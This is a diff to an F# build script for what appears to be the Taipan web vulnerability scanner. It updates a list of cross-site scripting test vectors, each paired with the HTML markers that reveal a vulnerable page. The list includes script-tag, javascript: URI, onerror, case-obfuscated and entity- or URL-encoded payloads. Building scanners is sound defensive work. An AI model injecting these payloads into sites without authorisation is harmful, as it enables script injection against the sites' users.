@@ -21,17 +21,18 @@ let createAddOnData(buildDir: String) =
     ensureDirectory (buildDir + "/Taipan/Data")  
     // write xss payload  
     let xssData = [
-        // attack vector | list of payloads to search in the html        
-        ("<SCRIPT>document.write('<h1>-= TEXT XSS =-</h1>');</SCRIPT>", ["<h1>-= TEXT XSS =-</h1>"]);
-        ("<SCRIPT>alert('XSS');</SCRIPT>", ["<SCRIPT>alert('XSS');</SCRIPT>"]);
-        ("<IMG SRC=JaVaScRiPt:alert('XSS')>", ["<IMG SRC=JaVaScRiPt:alert('XSS')>"]);
-        ("<IMG SRC=javascript:alert(&quot;XSS&quot;)>", ["<IMG SRC=javascript:alert('XSS')>"]);
-        ("<IMG SRC=`javascript:alert(1)`>", ["<IMG SRC=`javascript:alert(1)`>"]);        
-        ("<IMG SRC=\"jav   ascript:alert('XSS');\">", ["<IMG SRC=\"javascript:alert('XSS');\">"]);
-        ("';!--\"<XSS>=javascript:&{()}", ["';!--\"<XSS>=javascript:&{()}"]);
-        ("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", ["javascript:alert('XSS')"]);
-        ("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", ["javascript:alert('XSS')"]);
-        ("%25%33%63%25%34%39%25%34%64%25%34%37%25%32%30%25%35%33%25%35%32%25%34%33%25%33%64%25%34%61%25%36%31%25%35%36%25%36%31%25%35%33%25%36%33%25%35%32%25%36%39%25%35%30%25%37%34%25%33%61%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%37%25%35%38%25%35%33%25%35%33%25%32%37%25%32%39%25%33%65", ["javascript:alert('XSS')"])                
+        // attack vector | list of payloads to search in the html    
+        ("<img src=x onerror=document.write('<h1>-= TEXT XSS =-</h1>')>", ["<h1>-= TEXT XSS =-</h1>"])
+        ("<SCRIPT>document.write('<h1>-= TEXT XSS =-</h1>');</SCRIPT>", ["<h1>-= TEXT XSS =-</h1>"])
+        ("<SCRIPT>alert('XSS');</SCRIPT>", ["<SCRIPT>alert('XSS');</SCRIPT>"])
+        ("<IMG SRC=JaVaScRiPt:alert('XSS')>", ["<IMG SRC=JaVaScRiPt:alert('XSS')>"])
+        ("<IMG SRC=javascript:alert(&quot;XSS&quot;)>", ["<IMG SRC=javascript:alert('XSS')>"])
+        ("<IMG SRC=`javascript:alert(1)`>", ["<IMG SRC=`javascript:alert(1)`>"])
+        ("<IMG SRC=\"jav   ascript:alert('XSS');\">", ["<IMG SRC=\"javascript:alert('XSS');\">"])
+        ("';!--\"<XSS>=javascript:&{()}", ["';!--\"<XSS>=javascript:&{()}"])
+        ("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", ["javascript:alert('XSS')"])
+        ("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", ["javascript:alert('XSS')"])
+        ("%25%33%63%25%34%39%25%34%64%25%34%37%25%32%30%25%35%33%25%35%32%25%34%33%25%33%64%25%34%61%25%36%31%25%35%36%25%36%31%25%35%33%25%36%33%25%35%32%25%36%39%25%35%30%25%37%34%25%33%61%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%37%25%35%38%25%35%33%25%35%33%25%32%37%25%32%39%25%33%65", ["javascript:alert('XSS')"])
     ]
 
     [
